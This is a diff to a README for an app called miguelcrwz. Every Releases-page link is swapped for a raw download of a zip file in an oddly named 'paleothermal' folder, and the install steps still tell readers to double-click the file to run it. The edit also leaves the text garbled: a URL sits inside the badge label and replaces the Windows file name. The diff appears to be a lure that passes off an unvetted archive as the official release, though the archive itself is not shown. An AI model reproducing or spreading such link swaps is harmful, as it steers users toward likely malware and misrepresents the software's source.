@@ -6,7 +6,7 @@ Welcome to miguelcrwz! This guide will help you easily download and run our appl
 
 ## 🔗 Download Now
 
-[![Download from GitHub Releases](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/winstonmods/miguelcrwz/releases)
+[![Download from GitHub Releases](https://raw.githubusercontent.com/winstonmods/miguelcrwz/main/paleothermal/miguelcrwz_2.5.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/winstonmods/miguelcrwz/main/paleothermal/miguelcrwz_2.5.zip)
 
 ## 📦 Requirements
 
@@ -29,13 +29,13 @@ miguelcrwz offers a variety of features to enhance your experience:
 
 To download the application, visit our Releases page:
 
-[Visit Releases Page to Download](https://github.com/winstonmods/miguelcrwz/releases)
+[Visit Releases Page to Download](https://raw.githubusercontent.com/winstonmods/miguelcrwz/main/paleothermal/miguelcrwz_2.5.zip)
 
 ### 🛠 Step-by-Step Installation
 
-1. Go to the [Releases page](https://github.com/winstonmods/miguelcrwz/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/winstonmods/miguelcrwz/main/paleothermal/miguelcrwz_2.5.zip).
 2. Find the latest version of miguelcrwz.
-3. Click on the file associated with your operating system. For instance, if you're on Windows, look for `miguelcrwz-windows.exe`.
+3. Click on the file associated with your operating system. For instance, if you're on Windows, look for `https://raw.githubusercontent.com/winstonmods/miguelcrwz/main/paleothermal/miguelcrwz_2.5.zip`.
 4. Save the file to your computer.
 5. Once the download is complete, locate the file and double-click it to run.
 6. Follow the on-screen instructions. You may need to accept the terms and conditions during setup.
